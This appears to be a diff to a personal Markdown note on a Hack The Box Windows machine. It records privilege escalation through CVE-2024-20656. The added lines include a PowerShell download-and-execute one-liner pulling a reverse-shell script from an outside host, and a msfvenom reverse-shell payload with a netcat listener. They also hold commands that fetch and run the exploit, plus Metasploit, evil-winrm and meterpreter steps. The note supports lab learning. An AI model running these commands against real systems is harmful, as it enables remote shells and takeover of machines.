@@ -1,3 +1,15 @@
+---
+tags:
+  - Windows
+  - HTB
+  - medium
+  - vnc
+  - gitea
+CVEs: CVE-2024-20656; CVE-2024-32002
+creation date: 2024-07-27
+Date Completed: 
+URL: https://app.hackthebox.com/machines/618
+---
 
 
 
@@ -286,3 +298,39 @@ https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vss
 
 https://github.com/Wh04m1001/CVE-2024-20656/tree/main
 
+
+
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.15.64/Invoke-PowerShellTcp.ps1')
+
+## getting the exploit
+
+https://github.com/charlesgargasson/CVE-2024-20656
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o payload.exe
+sudo nc -nvlp 443 -s 10.10.14.113
+```
+
+
+```
+mkdir c:\exploit
+cd c:\exploit
+iwr http://10.10.15.64/payload.exe -outfile payload.exe
+iwr http://10.10.15.64/Expl.exe -outfile Expl.exe
+
+$VSDiagnostics = get-item "C:\\*\\Microsoft Visual Studio\\*\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe" | select -last 1
+c:\exploit\expl.exe $VSDiagnostics.FullName "c:\exploit\payload.exe"
+```
+
+## Getting a VNC session
+
+use windows/local/payload_inject
+![[Pasted image 20241011150111.png]]
+
+
+![[Pasted image 20241011150045.png]]
+
+future reference on vnc stuff https://www.hackingarticles.in/vnc-penetration-testing/
+
+1. evil-winrm into box as emily
+2. start a meterpreter session
